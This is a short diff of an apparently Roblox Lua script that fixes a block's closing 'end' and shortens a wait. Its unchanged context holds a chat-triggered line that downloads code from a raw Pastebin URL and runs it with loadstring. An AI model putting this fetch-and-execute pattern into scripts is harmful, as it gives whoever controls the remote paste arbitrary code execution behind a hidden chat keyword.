@@ -77,6 +77,7 @@ local Player = game.Players.LocalPlayer
 Player.Chatted:connect(function(cht)
 	if cht:match(":benx .") then
 		loadstring(game:HttpGet("https://pastebin.com/raw/Bv3gABeH"))()
-wait(13)
+	wait(.5)
+end
 end)
 
